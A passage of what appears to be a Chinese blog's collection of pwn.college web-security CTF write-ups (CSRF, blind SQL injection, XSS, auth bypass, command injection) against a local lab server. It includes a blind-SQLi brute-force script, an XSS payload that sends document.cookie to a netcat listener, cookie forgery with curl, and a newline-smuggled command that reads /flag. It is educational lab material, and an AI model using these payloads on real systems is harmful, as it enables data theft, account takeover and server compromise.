class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://challenge.localhost/publish&quot;</span></span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如果是完全零基础，大概率会有疑问window.location.href是个什么东西（记得pwn.college的前面题目都没讲过这个东西），这里浅浅演示一下，深入的还得自己查，直接看下面这两张图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Web/CSRF-1/window-location-href1.png"><br>首先上面第一张图，看到我在浏览器的url里输入了这么个东西：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">javascript:alert(window.location.href)<br></code></pre></td></tr></table></figure><p>拆解一下，alert没什么好说的，alert的参数就是window这一大串，这个url意思就是执行冒号后面的javascript代码，当点击回车的时候，由于当前位于b站的首页，浏览器就会显示b站的域名,如下图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Web/CSRF-1/window-location-href2.png"><br>这样应该能感受到，window这一串其实可以理解为网页域名，这道题里我们通过对它赋值，起到了重定向的作用<br><br>至于javascript:是什么，其实就是一个伪协议头，可以把它理解为http:&#x2F;&#x2F;这样的东西，搜一下完整的URL组成可以知道这些都是协议头，简单记忆就是不带&#x2F;&#x2F;的就是伪协议，反之就是我们常见的协议头<br><br>伪协议还有很多，像mailto:，这个协议后面跟邮箱，浏览器就会唤起电脑里默认的邮件应用程序，还有tel:，跟个号码，打电话用的<br><br>上述基础知识只是一个简单的补充，以后碰到具体题目再做记录</p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQLi-5</title>
    <link href="/2025/07/17/pwn.college/Intro-to-Cybersecurity/Web/SQLi-5/"/>
    <url>/2025/07/17/pwn.college/Intro-to-Cybersecurity/Web/SQLi-5/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>这一题和一般的SQL注入都不同，服务端将不再回显任何SQL查询的结果，但幸好题目提示我们，即便不显示任何数据，我们也可以一个字符一个字符的恢复，这可以通过查询时页面不同的行为来判断，比如认证成功or认证失败</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>看完题面大概猜到是一个盲注，需要自己写脚本了，一个字符一个字符的爆破，然后看一下server端的源代码：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge_post</span>():<br>    username = flask.request.form.get(<span class="hljs-string">&quot;username&quot;</span>)<br>    password = flask.request.form.get(<span class="hljs-string">&quot;password&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing `username` form parameter&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> password:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing `password` form parameter&quot;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># https://www.sqlite.org/lang_select.html</span><br>        query = <span class="hljs-string">f&quot;SELECT rowid, * FROM users WHERE username = &#x27;<span class="hljs-subst">&#123;username&#125;</span>&#x27; AND password = &#x27;<span class="hljs-subst">&#123; password &#125;</span>&#x27;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;DEBUG: <span class="hljs-subst">&#123;query=&#125;</span>&quot;</span>)<br>        user = db.execute(query).fetchone()<br>    <span class="hljs-keyword">except</span> sqlite3.Error <span class="hljs-keyword">as</span> e:<br>        flask.abort(<span class="hljs-number">500</span>, <span class="hljs-string">f&quot;Query: <span class="hljs-subst">&#123;query&#125;</span>\nError: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:<br>        flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Invalid username or password&quot;</span>)<br><br>    flask.session[<span class="hljs-string">&quot;user&quot;</span>] = username<br>    <span class="hljs-keyword">return</span> flask.redirect(flask.request.path)<br></code></pre></td></tr></table></figure><p>这里可以发现查询语句是直接拼接生成，因此存在SQL注入风险，同时根据查询执行结果的不同，返回状态码403或者重定向，因此这是一个布尔盲注类型</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>首先确定闭合类型，根据上述源码，可以看到username和password都是字符型，单引号闭合<br><br>由于不需要联合查询，因此这一题里面可以不用判断字段数量<br><br>（其实也很好判断，看源码，rowid加上*，表里面有两列，一共就是3列，如果要联合查询的话就应该是如union select 1,2,3；确保列数一致即可）<br><br>(备注：如果没有源码该怎么判断，此时需要用到二分法试探，以后碰到具体题目再做记录……)</p><p>根据上述分析，可以开始写盲注脚本，主要思路就是首先根据flag的长度（因为每题flag都是一样的长度，很容易确定）作为外层循环，内层循环逐个试探可打印字符；<br><br>判断是否和flag对上的标准就是看返回状态码是否&#x3D;302（即重定向），脚本如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br>flag=<span class="hljs-string">r&quot;pwn.college&#123;&quot;</span><br>flagLen=<span class="hljs-number">59</span><br>url=<span class="hljs-string">&quot;http://challenge.localhost:80&quot;</span><br>hostName=&#123;<span class="hljs-string">&quot;Host&quot;</span>:<span class="hljs-string">&quot;challenge.localhost:80&quot;</span>&#125;<br>password=<span class="hljs-string">&quot;123456&quot;</span><br><span class="hljs-comment">#admin &#x27; and SUBSTR(password,1,1)=&#x27;p&#x27;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">13</span>,flagLen+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> charac <span class="hljs-keyword">in</span> string.printable:<br>        username=<span class="hljs-string">&quot;admin&#x27; and SUBSTR(password,&quot;</span>+<span class="hljs-built_in">str</span>(x)+<span class="hljs-string">&quot;,1)=&#x27;&quot;</span><br>        username+=charac<br>        username+=<span class="hljs-string">&quot;&#x27; -- &quot;</span><br>        body=&#123;<span class="hljs-string">&quot;username&quot;</span>:username,<span class="hljs-string">&quot;password&quot;</span>:password&#125;<br>        response=requests.post(url,data=body,headers=hostName)<br>        <span class="hljs-keyword">if</span> response.status_code==<span class="hljs-number">200</span>:<br>            flag+=charac<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br></code></pre></td></tr></table></figure><p>这里由于python的requests模块自动跟随重定向了，把判断条件改成状态码&#x3D;&#x3D;200，也可以关掉重定向，一样的<br><br>运行脚本后等待一段时间即可输出flag了<br><img src="/../../../../../../../photos/pwn.college/intro/Web/SQLi-5.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS-7</title>
    <link href="/2025/07/17/pwn.college/Intro-to-Cybersecurity/Web/XSS-7/"/>
    <url>/2025/07/17/pwn.college/Intro-to-Cybersecurity/Web/XSS-7/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一个攻击者的目标可能是完全接管受害者账户，这需要认证信息，该信息常存储在cookie中，如果能够拿到cookie，就可以绕过服务端的身份认证，这一关将登录用户的信息存储在了cookie中</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先看server端的源码<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> user:<br>        page += <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            &lt;form action=draft method=post&gt;</span><br><span class="hljs-string">              Post:&lt;textarea name=content&gt;Write something!&lt;/textarea&gt;</span><br><span class="hljs-string">              &lt;input type=checkbox name=publish&gt;Publish</span><br><span class="hljs-string">              &lt;input type=submit value=Save&gt;</span><br><span class="hljs-string">            &lt;/form&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;form action=publish method=post&gt;&lt;input type=submit value=&quot;Publish All Drafts&quot;&gt;&lt;/form&gt;</span><br><span class="hljs-string">            &lt;hr&gt;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>在发布帖子时，直接拼接用户输入，因此存在XSS漏洞。首先考虑能不能跟XSS-5和6一样，重定向admin用户，让它自己把帖子发出来，但是看到&#x2F;publish路由下存在校验：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> username == <span class="hljs-string">&quot;admin&quot;</span>:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;pwnpost no longer supports admin posting due to rampant flag disclosure&quot;</span>)<br></code></pre></td></tr></table></figure><p>因此无法再通过类似前两题的方式泄露flag，根据题目提示需要我们泄露admin的cookie，再看一下设置cookie的逻辑如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge_login</span>():<br>    username = flask.request.form.get(<span class="hljs-string">&quot;username&quot;</span>)<br>    password = flask.request.form.get(<span class="hljs-string">&quot;password&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing `username` form parameter&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> password:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing `password` form parameter&quot;</span>)<br><br>    <span class="hljs-comment"># https://www.sqlite.org/lang_select.html</span><br>    user = db.execute(<span class="hljs-string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>, (username, password)).fetchone()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:<br>        flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Invalid username or password&quot;</span>)<br><br>    response = flask.redirect(<span class="hljs-string">&quot;/&quot;</span>)<br>    response.set_cookie(<span class="hljs-string">&quot;auth&quot;</span>, username + <span class="hljs-string">&quot;|&quot;</span> + password)<br>    <span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure><p>由于flask默认不开启httponly，因此可以结合XSS漏洞，通过Javascript的document.cookie属性获取cookie</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>根据上述分析，首先要完成XSS注入，之后诱导admin用户访问网页，此时网页会执行注入的js代码，将cookie发到攻击者的服务器<br><br>具体步骤如下：<br><br>首先以guest身份登录，在发帖区填入恶意payload<br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://localhost:12345&quot;</span>,&#123;<span class="hljs-attr">method</span>:<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-attr">body</span>:<span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)&#125;)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>点击提交后，开启接收cookie的服务，此题中在本地开放一个端口即可，尽量选择端口号大一些的，防止被已有进程占用：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -l 12345<br></code></pre></td></tr></table></figure><p>之后运行challenge&#x2F;victim脚本，模拟受害者访问网页的步骤，此时即可在监听端口处看到返回的cookie：<br><br><img src="/../../../../../../../photos/pwn.college/intro/Web/XSS-7/LeakToken.png"><br>cookie里包含着admin的口令（其实是flag的倒数20个字符），URL解码之后再次去浏览器以admin身份登录，可以看到其名下的草稿（即flag）<br><img src="/../../../../../../../photos/pwn.college/intro/Web/XSS-7/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS-5</title>
    <link href="/2025/07/15/pwn.college/Intro-to-Cybersecurity/Web/XSS-5/"/>
    <url>/2025/07/15/pwn.college/Intro-to-Cybersecurity/Web/XSS-5/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>&#x2F;challenge目录下有两个程序，server脚本开启网络服务，该服务模拟一个论坛功能，存在登录、发布帖子以及存草稿等功能，victim脚本模拟受害者，会去访问论坛网页，如果XSS注入成功，就能得到flag</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>先看server端源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">db.execute(<span class="hljs-string">&quot;&quot;&quot;CREATE TABLE posts AS SELECT ? AS content, &quot;admin&quot; AS author, FALSE AS published&quot;&quot;&quot;</span>, [flag])<br>db.execute(<span class="hljs-string">&quot;&quot;&quot;CREATE TABLE posts AS SELECT ? AS content, &quot;admin&quot; AS author, FALSE AS published&quot;&quot;&quot;</span>, [flag])<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/publish&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge_publish</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> flask.session:<br>        flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Log in first!&quot;</span>)<br><br>    <span class="hljs-comment"># https://www.sqlite.org/lang_update.html</span><br>    db.execute(<span class="hljs-string">&quot;UPDATE posts SET published = TRUE WHERE author = ?&quot;</span>, [flask.session.get(<span class="hljs-string">&quot;username&quot;</span>)])<br>    <span class="hljs-keyword">return</span> flask.redirect(<span class="hljs-string">&quot;/&quot;</span>)<br></code></pre></td></tr></table></figure><p>通过分析上述代码块，发现admin用户名下的帖子正是需要的flag，但初始是草稿状态，只能显示开头12个字符，因此需要想办法让admin把自己的贴子发布出去<br><br>同时注意到如果对应的用户访问了&#x2F;publish路由，就会直接将自己名下的草稿全部发出去，没有二次校验，因此想办法让admin访问注入后的页面，正好观察victim代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">challenge_url = <span class="hljs-string">&quot;http://challenge.localhost:80/&quot;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Visiting <span class="hljs-subst">&#123;challenge_url&#125;</span>&quot;</span>)<br>browser.get(challenge_url)<br><br>browser.find_element(By.NAME, <span class="hljs-string">&quot;username&quot;</span>).send_keys(<span class="hljs-string">&quot;admin&quot;</span>)<br>browser.find_element(By.NAME, <span class="hljs-string">&quot;password&quot;</span>).send_keys(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>).read().strip())<br>browser.find_element(By.NAME, <span class="hljs-string">&quot;submit&quot;</span>).submit()<br></code></pre></td></tr></table></figure><p>可以发现该脚本正是需要的模拟admin登录，因此可以尝试注入js脚本达到欺骗admin把帖子发出去的目的</p><h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><p>由于guest用户的口令是已知的，可以先以guest身份登录，发布包含恶意Javascript代码的帖子，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://challenge.localhost/publish&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>之后再运行victim脚本，最后刷新网页，可以观察到flag泄露<br><img src="/../../../../../../../photos/pwn.college/intro/Web/XSS5-flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>AuthByPass-2</title>
    <link href="/2025/07/14/pwn.college/Intro-to-Cybersecurity/Web/AuthByPass-2/"/>
    <url>/2025/07/14/pwn.college/Intro-to-Cybersecurity/Web/AuthByPass-2/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>&#x2F;challenge&#x2F;server开启一个用户登录的服务，接收POST请求和GET请求，POST请求要求输入用户名和口令，并去数据库校验；<br><br>GET请求读取传入的cookie值，如果session_user字段是admin就会回显flag到网页</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>阅读server脚本的源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge_post</span>():<br>    username = flask.request.form.get(<span class="hljs-string">&quot;username&quot;</span>)<br>    password = flask.request.form.get(<span class="hljs-string">&quot;password&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing `username` form parameter&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> password:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing `password` form parameter&quot;</span>)<br><br>    <span class="hljs-comment"># https://www.sqlite.org/lang_select.html</span><br>    user = db.execute(<span class="hljs-string">&quot;SELECT rowid, * FROM users WHERE username = ? AND password = ?&quot;</span>, (username, password)).fetchone()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:<br>        flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Invalid username or password&quot;</span>)<br><br>    response = flask.redirect(flask.request.path)<br>    response.set_cookie(<span class="hljs-string">&#x27;session_user&#x27;</span>, username)<br>    <span class="hljs-keyword">return</span> response<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge_get</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (username := flask.request.cookies.get(<span class="hljs-string">&quot;session_user&quot;</span>, <span class="hljs-literal">None</span>)):<br>        page = <span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        page = <span class="hljs-string">f&quot;&lt;html&gt;&lt;body&gt;Hello, <span class="hljs-subst">&#123;username&#125;</span>!&quot;</span><br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&quot;admin&quot;</span>:<br>            page += <span class="hljs-string">&quot;&lt;br&gt;Here is your flag: &quot;</span> + <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>).read()<br></code></pre></td></tr></table></figure><p>发现服务端的身份验证是有漏洞的，因为当发起GET请求同时传入的cookie是admin的话，就不会再次校验admin的口令，因此首先以guest身份登录，并保存cookie</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://challenge.localhost:80&quot;</span> -X POST -H <span class="hljs-string">&quot;Host:challenge.localhost:80&quot;</span> -c cookies.txt -d <span class="hljs-string">&quot;username=guest&amp;password=password&quot;</span><br></code></pre></td></tr></table></figure><p>去当前文件夹下把cookies.txt里的session_user字段改为admin<br><img src="/../../../../../../../photos/pwn.college/intro/Web/AuthByPass-2/cookie.png"><br>修改完后向服务端再次发起请求，只不过这次是发送GET请求，并且携带该cookie</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://challenge.localhost:80?&quot;</span> -H <span class="hljs-string">&quot;Host:challenge.localhost:80&quot;</span> -b cookies.txt<br></code></pre></td></tr></table></figure><p>最后得到包含flag的响应体<br><img src="/../../../../../../../photos/pwn.college/intro/Web/AuthByPass-2/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CMDi-6</title>
    <link href="/2025/07/14/pwn.college/Intro-to-Cybersecurity/Web/CMDi-6/"/>
    <url>/2025/07/14/pwn.college/Intro-to-Cybersecurity/Web/CMDi-6/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>&#x2F;challenge目录下面有一个python写的server脚本，运行它会在本机的80端口开放一个http服务。这个命令接收GET方法传参，并且以该参数执行ls命令<br><br>我们需要做的就是想办法在ls之后让服务器的shell再执行我们想要的命令，即连续执行</p><span id="more"></span><h1 id="漏洞点与难点分析"><a href="#漏洞点与难点分析" class="headerlink" title="漏洞点与难点分析"></a>漏洞点与难点分析</h1><p>首先观察server脚本的源代码：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">arg = (<br>        flask.request.args.get(<span class="hljs-string">&quot;subdirectory&quot;</span>, <span class="hljs-string">&quot;/challenge&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    )<br>    command = <span class="hljs-string">f&quot;ls -l <span class="hljs-subst">&#123;arg&#125;</span>&quot;</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;DEBUG: <span class="hljs-subst">&#123;command=&#125;</span>&quot;</span>)<br>    result = subprocess.run(<br>        command,  <span class="hljs-comment"># the command to run</span><br>        shell=<span class="hljs-literal">True</span>,  <span class="hljs-comment"># use the shell to run this command</span><br>        stdout=subprocess.PIPE,  <span class="hljs-comment"># capture the standard output</span><br>        stderr=subprocess.STDOUT,  <span class="hljs-comment"># 2&gt;&amp;1</span><br>        encoding=<span class="hljs-string">&quot;latin&quot;</span>,  <span class="hljs-comment"># capture the resulting output as text</span><br>    ).stdout<br></code></pre></td></tr></table></figure><p>发现常见的命令连接符都被过滤了，但是仔细观察发现换行符是漏网之鱼，而在Linux中，换行符也可以起到连续执行命令的效果</p><h1 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h1><p>经过上述分析，直接使用curl工具完成漏洞利用：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://challenge.localhost:80/trial?subdirectory=/challenge%0acat%20/flag&quot;</span><br></code></pre></td></tr></table></figure><p>成功得到包含flag的响应体：<br><br><img src="/../../../../../../../photos/pwn.college/intro/Web/CMDi-6.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
